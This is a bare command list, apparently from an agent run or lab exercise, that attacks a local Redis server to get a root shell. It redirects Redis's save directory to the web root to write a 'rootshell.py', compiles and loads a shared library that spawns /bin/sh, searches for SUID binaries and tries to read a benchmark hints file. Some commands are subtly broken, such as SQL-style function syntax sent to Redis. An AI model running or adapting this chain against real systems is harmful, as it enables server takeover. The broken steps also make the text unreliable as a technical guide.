commands:
cat /opt/bench/cap-hints.txt 2>/dev/null; redis-cli -h 127.0.0.1 -p 6379 CONFIG GET dir; redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dir /var/www/html; redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dbfilename rootshell.py; echo 'import os; os.setuid(0); os.system("id")' > /var/www/html/rootshell.py; redis-cli -h 127.0.0.1 -p 6379 BGSAVE; sleep 2; cat /var/www/html/rootshell.py; redis-cli -h 127.0.0.1 -p 6379 MODULE LOAD /usr/lib/redis/modules/redis.so; redis-cli -h 127.0.0.1 -p 6379 FUNCTION LOAD 'CREATE FUNCTION sys_exec AS '''/tmp/libexec.so''' LANGUAGE C'; echo '#include <unistd.h>
#include <stdlib.h>
char *argv[] = {"/bin/sh", NULL};
int sys_exec() { execve("/bin/sh", argv, NULL); return 0; }' > /tmp/libexec.c; gcc -shared -fPIC -o /tmp/libexec.so /tmp/libexec.c; redis-cli -h 127.0.0.1 -p 6379 MODULE LOAD /tmp/libexec.so; redis-cli -h 127.0.0.1 -p 6379 FUNCTION DUMP; cat /proc/net/tcp; ss -tulnp; find / -perm -4000 2>/dev/null; /usr/bin/sudo.ws /bin/sh

